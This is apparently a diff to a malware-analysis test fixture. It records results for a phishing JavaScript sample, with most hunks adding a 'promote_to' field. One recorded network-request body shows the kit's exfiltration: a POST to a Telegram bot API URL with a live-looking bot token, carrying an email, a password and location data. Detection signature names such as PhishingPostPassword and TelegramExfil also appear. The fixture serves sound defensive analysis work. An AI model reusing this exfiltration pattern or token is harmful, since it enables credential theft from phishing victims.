@@ -18,6 +18,7 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Long One-Liner",
         "zeroize_on_tag_safe": false
@@ -30,6 +31,7 @@
         "classification": "TLP:C",
         "depth": 0,
         "heuristic": null,
+        "promote_to": null,
         "tags": {},
         "title_text": "Signatures",
         "zeroize_on_tag_safe": false
@@ -53,6 +55,7 @@
             "append_and_click": 1
           }
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Signature: AppendAndClick",
         "zeroize_on_tag_safe": false
@@ -76,6 +79,7 @@
             "geoip_service_request": 1
           }
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Signature: GeoIPServiceRequest",
         "zeroize_on_tag_safe": false
@@ -99,6 +103,7 @@
             "jquery_network_request": 1
           }
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Signature: JQueryNetworkRequest",
         "zeroize_on_tag_safe": false
@@ -122,6 +127,7 @@
             "network_request": 1
           }
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Signature: NetworkRequest",
         "zeroize_on_tag_safe": false
@@ -145,6 +151,7 @@
             "phishing_logo_download": 1
           }
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Signature: PhishingLogoDownload",
         "zeroize_on_tag_safe": false
@@ -168,6 +175,7 @@
             "phishing_post_password": 1
           }
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Signature: PhishingPostPassword",
         "zeroize_on_tag_safe": false
@@ -191,6 +199,7 @@
             "phishing_terms": 1
           }
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Signature: PhishingTerms",
         "zeroize_on_tag_safe": false
@@ -214,6 +223,7 @@
             "sleep": 1
           }
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Signature: Sleep",
         "zeroize_on_tag_safe": false
@@ -237,6 +247,7 @@
             "telegram_exfil": 1
           }
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "Signature: TelegramExfil",
         "zeroize_on_tag_safe": false
@@ -260,6 +271,7 @@
             "obfuscator_io_url_redirect": 1
           }
         },
+        "promote_to": null,
         "tags": {
           "network": {
             "static": {
@@ -298,6 +310,7 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {
           "network": {
             "static": {
@@ -335,7 +348,7 @@
       },
       {
         "auto_collapse": false,
-        "body": "[{\"url\": \"https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js\", \"method\": \"get\"}, {\"url\": \"https://ip.seeip.org/geoip\", \"method\": \"get\"}, {\"url\": \"https://api.telegram.org/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage\", \"method\": \"post\", \"request_body\": {\"chat_id\": \"-571909261\", \"text\": \"///Liftca Cloud Voicemail by Agbasa Juju(Weed,Coffee,Exercise,Prayer)///\\n\\nEmail: jami.reich@liftca.org\\nPassword : JsJ@w$==C00l!\\nIP Address : 127.0.0.1\\nRegion : Ottawa\\nCity : Ottawa\\nCountry : Canada\\nUseragent : Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)\\nFormat : 103,000=371,800\\nDate Filled : 7/28/2023\\nDateSent : 12/12/2022 8:01:03 a.m.\"}}]",
+        "body": "[{\"url\": \"https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js\", \"method\": \"get\"}, {\"url\": \"https://ip.seeip.org/geoip\", \"method\": \"get\"}, {\"url\": \"https://api.telegram.org/bot1843792137:AAEK1uKnboDz64W-OXeP8M3behanH1pvFhw/sendMessage\", \"method\": \"post\", \"request_body\": {\"chat_id\": \"-571909261\", \"text\": \"///Liftca Cloud Voicemail by Agbasa Juju(Weed,Coffee,Exercise,Prayer)///\\n\\nEmail: jami.reich@liftca.org\\nPassword : JsJ@w$==C00l!\\nIP Address : 127.0.0.1\\nRegion : Ottawa\\nCity : Ottawa\\nCountry : Canada\\nUseragent : Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 10.0; WOW64; Trident/7.0; Touch; .NET4.0C; .NET4.0E; .NET CLR 2.0.50727; .NET CLR 3.0.30729; .NET CLR 3.5.30729)\\nFormat : 103,000=371,800\\nDate Filled : 10/16/2023\\nDateSent : 12/12/2022 8:01:03 a.m.\"}}]",
         "body_config": {
           "column_order": [
             "url",
@@ -360,6 +373,7 @@
             "obfuscator_io_usage_url": 1
           }
         },
+        "promote_to": null,
         "tags": {
           "network": {
             "dynamic": {
@@ -399,6 +413,7 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "JS-X-Ray IOCs Detected",
         "zeroize_on_tag_safe": false
@@ -418,6 +433,7 @@
           "score_map": {},
           "signatures": {}
         },
+        "promote_to": null,
         "tags": {},
         "title_text": "The file was deobfuscated/cleaned by Synchrony",
         "zeroize_on_tag_safe": false
